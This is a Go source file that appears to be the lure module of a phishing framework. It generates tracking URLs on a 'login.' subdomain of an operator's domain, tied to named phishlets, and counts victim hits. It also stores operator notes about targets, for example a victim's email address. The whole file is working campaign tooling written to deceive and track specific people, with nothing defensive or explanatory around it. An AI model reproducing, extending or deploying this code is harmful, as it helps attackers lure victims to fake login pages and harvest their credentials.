package lure

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/url"
	"strings"
	"sync"
	"time"
)

// Lure represents a tracking URL sent to a victim
type Lure struct {
	ID        string    `json:"id"`
	Phishlet  string    `json:"phishlet"`
	Path      string    `json:"path"`
	RedirectURL string  `json:"redirect_url"`
	Params    url.Values `json:"params"`
	CreatedAt time.Time `json:"created_at"`
	Hits      int       `json:"hits"`
	Info      string    `json:"info"` // Operator notes (e.g., "target: john@corp.com")
}

// Generator creates and manages tracking lure URLs
type Generator struct {
	mu     sync.RWMutex
	lures  map[string]*Lure
	domain string
}

// NewGenerator creates a new lure URL generator
func NewGenerator(domain string) *Generator {
	return &Generator{
		lures:  make(map[string]*Lure),
		domain: domain,
	}
}

// Create generates a new lure URL with a unique tracking ID
func (g *Generator) Create(phishletName, path, info string, redirectURL string) *Lure {
	g.mu.Lock()
	defer g.mu.Unlock()

	id := generateLureID()

	if path == "" {
		path = "/"
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}

	lure := &Lure{
		ID:          id,
		Phishlet:    phishletName,
		Path:        path,
		RedirectURL: redirectURL,
		CreatedAt:   time.Now(),
		Hits:        0,
		Info:        info,
	}

	g.lures[id] = lure
	return lure
}

// GetURL returns the full phishing URL for the given lure
func (g *Generator) GetURL(lure *Lure) string {
	u := url.URL{
		Scheme: "https",
		Host:   "login." + g.domain,
		Path:   lure.Path,
	}
	q := u.Query()
	q.Set("_lid", lure.ID)
	u.RawQuery = q.Encode()
	return u.String()
}

// Track records a hit for the given lure ID and returns the lure
func (g *Generator) Track(lureID string) (*Lure, bool) {
	g.mu.Lock()
	defer g.mu.Unlock()

	lure, ok := g.lures[lureID]
	if !ok {
		return nil, false
	}

	lure.Hits++
	return lure, true
}

// Get returns a lure by ID
func (g *Generator) Get(id string) (*Lure, bool) {
	g.mu.RLock()
	defer g.mu.RUnlock()
	l, ok := g.lures[id]
	return l, ok
}

// List returns all lures
func (g *Generator) List() []*Lure {
	g.mu.RLock()
	defer g.mu.RUnlock()

	result := make([]*Lure, 0, len(g.lures))
	for _, l := range g.lures {
		result = append(result, l)
	}
	return result
}

// Delete removes a lure by ID
func (g *Generator) Delete(id string) {
	g.mu.Lock()
	defer g.mu.Unlock()
	delete(g.lures, id)
}

func generateLureID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return fmt.Sprintf("pg_%s", hex.EncodeToString(b))
}
